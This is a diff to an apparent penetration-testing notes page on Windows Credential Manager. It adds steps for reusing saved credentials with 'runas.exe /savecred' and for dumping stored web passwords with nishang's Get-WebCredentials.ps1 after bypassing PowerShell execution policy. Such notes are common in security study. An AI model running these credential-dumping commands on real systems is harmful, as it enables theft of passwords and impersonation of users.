@@ -10,7 +10,7 @@
 
 {% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager" %}
 
-3. **GetWebCredentials.ps1 (nishang)**
+3. **Get-WebCredentials.ps1 (nishang)**
 
 {% embed url="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1" %}
 
@@ -54,6 +54,38 @@ C:\> vaultcmd /listcreds:"windows credentials"
 C:\> cmdkey /list
 ```
 
+### Retrieving/exploiting stored credentials
+
+#### (1) runas.exe&#x20;
+
+We can use the `runas.exe` command to run commands (eg. `cmd.exe`) as a particular user with stored credentials.
+
+```powershell
+C:\> runas.exe /savecred /user:<username> <command_to_execute>
+
+# eg. to spawn a command prompt for the username "USER" 
+C:\> runas.exe /savecred /user:USER cmd.exe
+```
+
+* `/savecred`: Indicates if the credentials have been previously saved by this user
+  * This option is required to tell `runas.exe` to pull the stored credentials
+
+#### (2) GetWebCredentials.ps1
+
+The `vaultcmd` and `cmdkey` commands does not provide methods to show the password. Thus, we have to realy on external PowerShell scripts such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1):
+
+> Ensure to run powershell with the bypass policy
+
+```powershell
+C:\> powershell -ep bypass
+C:\> Import-Module Get-WebCredentials.ps1
+C:\> Get-WebCredentials
+
+UserName  Resource             Password     Properties
+--------  --------             --------     ----------
+...
+```
+
 ### Overview of differences between `vaultcmd` and `cmdkey`
 
 1. `vaultcmd /list`&#x20;
@@ -67,14 +99,4 @@ a. Displays the credentials stored under **Windows Credentials** only
 b. Displays the entries added via `cmdkey /add` or `runas.exe /savecred` commands
 
 c. The output from the `vaultcmd /list` may overlap with the results from `vaultcmd /listcreds`
-
-
-
-
-
-
-
-
-
-
 
